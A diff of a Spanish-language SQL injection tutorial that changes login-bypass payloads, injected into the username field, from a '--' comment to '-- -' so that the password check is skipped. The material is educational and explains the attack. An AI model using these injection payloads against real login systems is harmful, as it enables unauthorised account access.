@@ -24,7 +24,7 @@ select id,username,subscription from users where username = 'administrator' and 
 #### Query inyectada:
 
 ````sql
-select id,username,subscription from users where username = 'administrator'--' and password = '@variable';
+select id,username,subscription from users where username = 'administrator'-- -' and password = '@variable';
 ````
 
 ---
@@ -58,10 +58,10 @@ select id,username,subscription from users where username = 'F0n3' and password 
 
 ````sql
 # Version Web
-select id,username,subscription from users where username = 'F0n3' --' and password = 'Ya_no_importa_nada_que_escriba_aquí_lol!';
+select id,username,subscription from users where username = 'F0n3' -- -' and password = 'Ya_no_importa_nada_que_escriba_aquí_lol!';
 
 # Consola SQL
-select id,username,subscription from users where username = 'F0n3'; --'; and password = 'Ya_no_importa_nada_que_escriba_aquí_lol!';
+select id,username,subscription from users where username = 'F0n3'; -- -'; and password = 'Ya_no_importa_nada_que_escriba_aquí_lol!';
 ````
 ````py
 +----+----------+--------------+
